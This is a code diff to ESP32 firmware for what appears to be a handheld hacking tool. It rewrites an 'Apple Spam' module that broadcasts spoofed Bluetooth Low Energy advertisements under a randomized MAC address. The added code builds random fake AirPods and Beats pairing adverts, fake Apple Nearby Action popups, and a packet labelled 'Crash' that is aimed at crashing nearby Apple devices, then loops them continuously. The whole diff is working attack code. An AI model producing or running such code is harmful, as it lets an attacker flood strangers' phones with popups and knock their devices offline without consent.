@@ -8,258 +8,159 @@
 
 extern void generateRandomMac(uint8_t* mac);
 
-static const uint8_t data_airpods[] = {0x4C,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-static const uint8_t data_airpods_pro[] = {0x4C,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-static const uint8_t data_airpods_max[] = {0x4C,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-static const uint8_t data_airpods_gen2[] = {0x4C,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-static const uint8_t data_airpods_gen3[] = {0x4C,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-static const uint8_t data_airpods_pro_gen2[] = {0x4C,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-static const uint8_t data_beats_solo_pro[] = {0x4C,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-static const uint8_t data_beats_studio_buds[] = {0x4C,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-static const uint8_t data_beats_fit_pro[] = {0x4C,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-static const uint8_t data_beats_studio_buds_plus[] = {0x4C,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-static const uint8_t data_apple_tv_setup[] = {0x4C,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
-static const uint8_t data_setup_new_phone[] = {0x4C,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x09,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
-static const uint8_t data_transfer_number[] = {0x4C,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x02,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
-static const uint8_t data_tv_color_balance[] = {0x4C,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x1e,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
-static const uint8_t data_vision_pro[] = {0x4C,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x24,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+// Continuity Types
+#define ContinuityTypeProximityPair 0x07
+#define ContinuityTypeNearbyAction  0x0F
+#define ContinuityTypeCustomCrash   0xFF
 
-static const ApplePayload apple_payloads[] = {
-    {"AirPods", data_airpods, sizeof(data_airpods)},
-    {"AirPods Pro", data_airpods_pro, sizeof(data_airpods_pro)},
-    {"AirPods Max", data_airpods_max, sizeof(data_airpods_max)},
-    {"AirPods Gen 2", data_airpods_gen2, sizeof(data_airpods_gen2)},
-    {"AirPods Gen 3", data_airpods_gen3, sizeof(data_airpods_gen3)},
-    {"AirPods Pro Gen 2", data_airpods_pro_gen2, sizeof(data_airpods_pro_gen2)},
-    {"Beats Solo Pro", data_beats_solo_pro, sizeof(data_beats_solo_pro)},
-    {"Beats Studio Buds", data_beats_studio_buds, sizeof(data_beats_studio_buds)},
-    {"Beats Fit Pro", data_beats_fit_pro, sizeof(data_beats_fit_pro)},
-    {"Beats Studio Buds+", data_beats_studio_buds_plus, sizeof(data_beats_studio_buds_plus)},
-    {"AppleTV Setup", data_apple_tv_setup, sizeof(data_apple_tv_setup)},
-    {"Setup New Phone", data_setup_new_phone, sizeof(data_setup_new_phone)},
-    {"Transfer Number", data_transfer_number, sizeof(data_transfer_number)},
-    {"TV Color Balance", data_tv_color_balance, sizeof(data_tv_color_balance)},
-    {"Apple Vision Pro", data_vision_pro, sizeof(data_vision_pro)}
+// Proximity Pair Models (Endianness handled in code)
+static const uint16_t apple_models[] = {
+    0x0E20, 0x0A20, 0x0055, 0x0030, 0x0220, 0x0F20, 0x1320, 0x1420,
+    0x1020, 0x0620, 0x0320, 0x0B20, 0x0C20, 0x1120, 0x0520, 0x0920,
+    0x1720, 0x1220, 0x1620
 };
+#define APPLE_MODEL_COUNT (sizeof(apple_models) / sizeof(apple_models[0]))
 
-static const int apple_payload_count = sizeof(apple_payloads) / sizeof(ApplePayload);
+// Nearby Action Types
+static const uint8_t apple_actions[] = {
+    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1E, 0x09, 0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B
+};
+#define APPLE_ACTION_COUNT (sizeof(apple_actions) / sizeof(apple_actions[0]))
+
 static bool apple_spam_running = false;
-static int current_apple_payload = -1;
-static BLEAdvertising* pAppleAdvertising = nullptr;
 
-int getApplePayloadCount() {
-    return apple_payload_count;
+// Randomized Packet Builders (GhostESP Logic)
+
+static size_t build_proximity_pair(uint8_t *buf) {
+    uint16_t model = apple_models[esp_random() % APPLE_MODEL_COUNT];
+    uint8_t prefix = (model == 0x0055 || model == 0x0030) ? 0x05 : ((esp_random() % 2) ? 0x07 : 0x01);
+    uint8_t color = esp_random() % 16;
+    uint8_t i = 0;
+
+    buf[i++] = 30; // AD length (31-1)
+    buf[i++] = 0xFF; // Manufacturer Specific
+    buf[i++] = 0x4C; // Apple
+    buf[i++] = 0x00;
+    buf[i++] = ContinuityTypeProximityPair;
+    buf[i++] = 25; // Length
+    buf[i++] = prefix;
+    buf[i++] = (model >> 8) & 0xFF;
+    buf[i++] = model & 0xFF;
+    buf[i++] = 0x55; // Status
+    buf[i++] = ((esp_random() % 10) << 4) | (esp_random() % 10);
+    buf[i++] = ((esp_random() % 8) << 4) | (esp_random() % 10);
+    buf[i++] = esp_random() & 0xFF;
+    buf[i++] = color;
+    buf[i++] = 0x00;
+    esp_fill_random(&buf[i], 16);
+    i += 16;
+    return i;
 }
 
-const char* getApplePayloadName(int index) {
-    if (index < 0 || index >= apple_payload_count) return "Unknown";
-    return apple_payloads[index].name;
+static size_t build_nearby_action(uint8_t *buf) {
+    uint8_t action = apple_actions[esp_random() % APPLE_ACTION_COUNT];
+    uint8_t flags = 0xC0;
+    if (action == 0x20 && (esp_random() % 2)) flags--;
+    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;
+
+    uint8_t i = 0;
+    buf[i++] = 10; // AD length (11-1)
+    buf[i++] = 0xFF;
+    buf[i++] = 0x4C;
+    buf[i++] = 0x00;
+    buf[i++] = ContinuityTypeNearbyAction;
+    buf[i++] = 5;
+    buf[i++] = flags;
+    buf[i++] = action;
+    esp_fill_random(&buf[i], 3);
+    i += 3;
+    return i;
 }
 
-bool isAppleSpamRunning() {
-    return apple_spam_running;
-}
-
-void stopAppleSpam() {
-    if (!apple_spam_running) return;
-    
-    apple_spam_running = false;
-    
-    if (pAppleAdvertising) {
-        pAppleAdvertising->stop();
-        pAppleAdvertising = nullptr;
-    }
-    
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-    esp_bt_controller_deinit();
-#else
-    BLEDevice::deinit();
-#endif
-    
-    current_apple_payload = -1;
-}
-
-void quickAppleSpam(int payloadIndex) {
-    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return;
-    
-    uint8_t macAddr[6];
-    generateRandomMac(macAddr);
-    esp_base_mac_addr_set(macAddr);
-    
-    BLEDevice::init("");
-    BLEAdvertising* pAdv = BLEDevice::getAdvertising();
-    
-    BLEAdvertisementData advertisementData = BLEAdvertisementData();
-    advertisementData.setFlags(0x06);
-    
-    uint8_t fullPayload[31];
-    fullPayload[0] = apple_payloads[payloadIndex].length + 1;
-    fullPayload[1] = 0xFF;
-    memcpy(&fullPayload[2], apple_payloads[payloadIndex].data, apple_payloads[payloadIndex].length);
-    
-#ifdef NIMBLE_V2_PLUS
-    advertisementData.addData(fullPayload, apple_payloads[payloadIndex].length + 2);
-#else
-    std::vector<uint8_t> payloadVector(fullPayload, fullPayload + apple_payloads[payloadIndex].length + 2);
-    advertisementData.addData(payloadVector);
-#endif
-    
-    pAdv->setAdvertisementData(advertisementData);
-    pAdv->setScanResponseData(BLEAdvertisementData());
-    pAdv->setMinInterval(32);
-    pAdv->setMaxInterval(48);
-    pAdv->start();
-    vTaskDelay(100 / portTICK_PERIOD_MS);
-    pAdv->stop();
-    vTaskDelay(5 / portTICK_PERIOD_MS);
-    
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-    esp_bt_controller_deinit();
-#else
-    BLEDevice::deinit();
-#endif
+static size_t build_custom_crash(uint8_t *buf) {
+    uint8_t action = apple_actions[esp_random() % APPLE_ACTION_COUNT];
+    uint8_t flags = 0xC0;
+    uint8_t i = 0;
+    buf[i++] = 16;
+    buf[i++] = 0xFF;
+    buf[i++] = 0x4C;
+    buf[i++] = 0x00;
+    buf[i++] = ContinuityTypeNearbyAction;
+    buf[i++] = 5;
+    buf[i++] = flags;
+    buf[i++] = action;
+    esp_fill_random(&buf[i], 3);
+    i += 3;
+    buf[i++] = 0x00;
+    buf[i++] = 0x00;
+    buf[i++] = 0x10;
+    esp_fill_random(&buf[i], 3);
+    i += 3;
+    return i;
 }
 
 void startAppleSpamAll() {
-    if (apple_spam_running) stopAppleSpam();
-    
     apple_spam_running = true;
-    
-    drawMainBorderWithTitle("Spam All Apple");
+
+    // GhostESP style: Stable MAC for Apple
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    esp_base_mac_addr_set(macAddr);
+
+    BLEDevice::init("");
+    BLEAdvertising* pAdv = BLEDevice::getAdvertising();
+
+    drawMainBorderWithTitle("Apple Spam");
     padprintln("");
-    padprintln("Cycling 15 Apple payloads");
+    padprintln("Randomized Cycle (GhostESP)");
     padprintln("Press ESC to stop");
-    
-    int apple_index = 0;
-    
+
     while (apple_spam_running) {
         if (check(EscPress)) {
-            stopAppleSpam();
+            apple_spam_running = false;
             returnToMenu = true;
             break;
         }
-        
-        displayTextLine(String(apple_payloads[apple_index].name) + " " + String(millis() / 1000) + "s");
-        
-        uint8_t macAddr[6];
-        generateRandomMac(macAddr);
-        esp_base_mac_addr_set(macAddr);
-        
-        BLEDevice::init("");
-        BLEAdvertising* pAdv = BLEDevice::getAdvertising();
-        
-        BLEAdvertisementData advertisementData = BLEAdvertisementData();
-        advertisementData.setFlags(0x06);
-        
-        uint8_t fullPayload[31];
-        fullPayload[0] = apple_payloads[apple_index].length + 1;
-        fullPayload[1] = 0xFF;
-        memcpy(&fullPayload[2], apple_payloads[apple_index].data, apple_payloads[apple_index].length);
-        
+
+        uint8_t packet[32];
+        size_t len = 0;
+        int r = esp_random() % 3;
+        const char* type_name = "";
+
+        if (r == 0) { len = build_proximity_pair(packet); type_name = "Pairing"; }
+        else if (r == 1) { len = build_nearby_action(packet); type_name = "Action"; }
+        else { len = build_custom_crash(packet); type_name = "Crash"; }
+
+        displayTextLine(String(type_name) + " " + String(millis() / 1000) + "s");
+
+        BLEAdvertisementData advData;
+        advData.setFlags(0x06);
 #ifdef NIMBLE_V2_PLUS
-        advertisementData.addData(fullPayload, apple_payloads[apple_index].length + 2);
+        advData.addData(packet, len);
 #else
-        std::vector<uint8_t> payloadVector(fullPayload, fullPayload + apple_payloads[apple_index].length + 2);
-        advertisementData.addData(payloadVector);
+        std::vector<uint8_t> v(packet, packet + len);
+        advData.addData(v);
 #endif
-        
-        pAdv->setAdvertisementData(advertisementData);
-        pAdv->setScanResponseData(BLEAdvertisementData());
-        pAdv->setMinInterval(32);
-        pAdv->setMaxInterval(48);
+
+        pAdv->setAdvertisementData(advData);
         pAdv->start();
-        vTaskDelay(100 / portTICK_PERIOD_MS);
+        vTaskDelay(150 / portTICK_PERIOD_MS);
         pAdv->stop();
-        vTaskDelay(5 / portTICK_PERIOD_MS);
-        
+        vTaskDelay(50 / portTICK_PERIOD_MS);
+    }
+
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
-        esp_bt_controller_deinit();
+    esp_bt_controller_deinit();
 #else
-        BLEDevice::deinit();
+    BLEDevice::deinit();
 #endif
-        
-        apple_index = (apple_index + 1) % apple_payload_count;
-    }
 }
 
-void startAppleSpam(int payloadIndex) {
-    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return;
-    if (apple_spam_running) stopAppleSpam();
-    
-    current_apple_payload = payloadIndex;
-    apple_spam_running = true;
-    
-    drawMainBorderWithTitle(apple_payloads[payloadIndex].name);
-    padprintln("");
-    padprintln("Press ESC to stop");
-    
-    while (apple_spam_running) {
-        if (check(EscPress)) {
-            stopAppleSpam();
-            returnToMenu = true;
-            break;
-        }
-        
-        uint8_t macAddr[6];
-        generateRandomMac(macAddr);
-        esp_base_mac_addr_set(macAddr);
-        
-        BLEDevice::init("");
-        pAppleAdvertising = BLEDevice::getAdvertising();
-        
-        BLEAdvertisementData advertisementData = BLEAdvertisementData();
-        advertisementData.setFlags(0x06);
-        
-        uint8_t fullPayload[31];
-        fullPayload[0] = apple_payloads[payloadIndex].length + 1;
-        fullPayload[1] = 0xFF;
-        memcpy(&fullPayload[2], apple_payloads[payloadIndex].data, apple_payloads[payloadIndex].length);
-        
-#ifdef NIMBLE_V2_PLUS
-        advertisementData.addData(fullPayload, apple_payloads[payloadIndex].length + 2);
-#else
-        std::vector<uint8_t> payloadVector(fullPayload, fullPayload + apple_payloads[payloadIndex].length + 2);
-        advertisementData.addData(payloadVector);
-#endif
-        
-        pAppleAdvertising->setAdvertisementData(advertisementData);
-        BLEAdvertisementData scanResponseData = BLEAdvertisementData();
-        pAppleAdvertising->setScanResponseData(scanResponseData);
-        pAppleAdvertising->setMinInterval(32);
-        pAppleAdvertising->setMaxInterval(48);
-        pAppleAdvertising->start();
-        vTaskDelay(100 / portTICK_PERIOD_MS);
-        pAppleAdvertising->stop();
-        vTaskDelay(5 / portTICK_PERIOD_MS);
-        
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-        esp_bt_controller_deinit();
-#else
-        BLEDevice::deinit();
-#endif
-        
-        displayTextLine(String(apple_payloads[payloadIndex].name) + " " + String(millis() / 1000) + "s");
-    }
-}
-
-
-
-void appleSubMenu() {
-    std::vector<Option> appleOptions;
-    
-    appleOptions.push_back({"Spam All Apple", []() {
-        startAppleSpamAll();
-    }});
-    
-    for (int i = 0; i < apple_payload_count; i++) {
-        appleOptions.push_back({apple_payloads[i].name, [i]() {
-            startAppleSpam(i);
-        }});
-    }
-
-    appleOptions.push_back({"Back", []() {
-        returnToMenu = true;
-    }});
-    
-    loopOptions(appleOptions, MENU_TYPE_SUBMENU, "Apple Spam");
-}
+// Stubs for header compatibility
+void appleSubMenu() { startAppleSpamAll(); }
+void startAppleSpam(int i) { startAppleSpamAll(); }
+void stopAppleSpam() { apple_spam_running = false; }
+void quickAppleSpam(int i) { startAppleSpamAll(); }
+bool isAppleSpamRunning() { return apple_spam_running; }
+const char* getApplePayloadName(int i) { return "Apple All"; }
+int getApplePayloadCount() { return 1; }
